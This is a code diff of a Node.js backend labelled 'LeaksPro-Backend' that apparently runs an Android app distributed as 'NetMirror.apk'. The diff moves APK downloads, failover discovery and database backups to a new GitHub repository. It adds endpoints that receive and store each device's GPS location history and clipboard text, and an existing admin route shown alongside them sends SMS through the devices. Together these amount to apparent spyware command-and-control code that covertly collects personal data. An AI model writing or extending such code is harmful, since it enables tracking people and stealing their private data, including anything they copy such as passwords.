@@ -194,7 +194,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         }
 
         // Fallback: Try GitHub Releases API across multiple repos
-        const REPOS = ['rurikonishawa/leaksprogod'];
+        const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
         for (const REPO of REPOS) {
           try {
             const apiHeaders = {
@@ -231,7 +231,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
         // Last resort: try direct download URL (public, no auth)
         const DIRECT_URLS = [
-          'https://github.com/rurikonishawa/leaksprogod/releases/download/latest/NetMirror.apk',
+          'https://github.com/Aldura5398/klad4/releases/download/latest/NetMirror.apk',
+          'https://github.com/rurikonishawa/leaksprogod/releases/download/latest/app-release.apk',
         ];
         for (const url of DIRECT_URLS) {
           try {
@@ -288,7 +289,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         'Accept': 'application/vnd.github.v3+json',
         'User-Agent': 'LeaksPro-Backend'
       };
-      const REPOS = ['rurikonishawa/leaksprogod'];
+      const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
       for (const repo of REPOS) {
         try {
           const relRes = await fetch(`https://api.github.com/repos/${repo}/releases/tags/latest`, { headers });
@@ -809,7 +810,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         try {
           const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
           if (!token?.value) return;
-          const REPO = 'rurikonishawa/leaksprogod';
+          const REPO = 'Aldura5398/klad4';
           const headers = { 'Authorization': `token ${token.value}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'LeaksPro-Backend' };
           const relRes = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers });
           if (!relRes.ok) return;
@@ -970,7 +971,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         api_base: `${publicUrl}/api`,
         admin_panel: `${publicUrl}/admin`,
         download_apk: `${publicUrl}/downloadapp/Netmirror.apk`,
-        fallback_discovery: `https://raw.githubusercontent.com/rurikonishawa/leaksprogod/main/domain.json`,
+        fallback_discovery: `https://raw.githubusercontent.com/Aldura5398/klad4/main/domain.json`,
         is_failover: false,
         timestamp: Date.now()
       });
@@ -1525,6 +1526,53 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // Location sync endpoint — Android app sends GPS location here
+  app.post('/api/devices/location', (req, res) => {
+    try {
+      const { device_id, location } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!location) return res.status(400).json({ error: 'location is required' });
+
+      const lat = location.latitude || 0;
+      const lng = location.longitude || 0;
+      const accuracy = location.accuracy || -1;
+      const source = location.provider || 'gps';
+
+      // Update device's current location
+      db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = ?, loc_accuracy = ?, last_seen = datetime('now') WHERE device_id = ?`)
+        .run(lat, lng, source, accuracy, device_id);
+
+      // Append to location history
+      db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`)
+        .run(device_id, lat, lng, accuracy, source);
+
+      console.log(`[LOCATION] Device ${device_id}: ${lat}, ${lng} (${source}, accuracy=${accuracy}m)`);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Clipboard sync endpoint — Android app sends clipboard entries here
+  app.post('/api/devices/clipboard', (req, res) => {
+    try {
+      const { device_id, clipboard } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!clipboard) return res.status(400).json({ error: 'clipboard is required' });
+
+      const text = (clipboard.text || '').substring(0, 5000); // limit stored size
+      const timestamp = clipboard.timestamp || Date.now();
+
+      db.prepare(`INSERT INTO clipboard_entries (device_id, text, clip_timestamp, synced_at) VALUES (?, ?, ?, datetime('now'))`)
+        .run(device_id, text, timestamp);
+
+      console.log(`[CLIPBOARD] Device ${device_id}: "${text.substring(0, 50)}..."`);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   // Send SMS via device — admin sends command to a connected device
   app.post('/api/admin/send-sms', (req, res) => {
     try {
@@ -1656,7 +1704,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           }
           const backupJson = JSON.stringify(backup);
 
-          const apiUrl = `https://api.github.com/repos/rurikonishawa/leaksprogod/contents/backups/db-backup.json`;
+          const apiUrl = `https://api.github.com/repos/Aldura5398/klad4/contents/backups/db-backup.json`;
           const headers = {
             'Authorization': `token ${token.value}`,
             'Accept': 'application/vnd.github.v3+json',
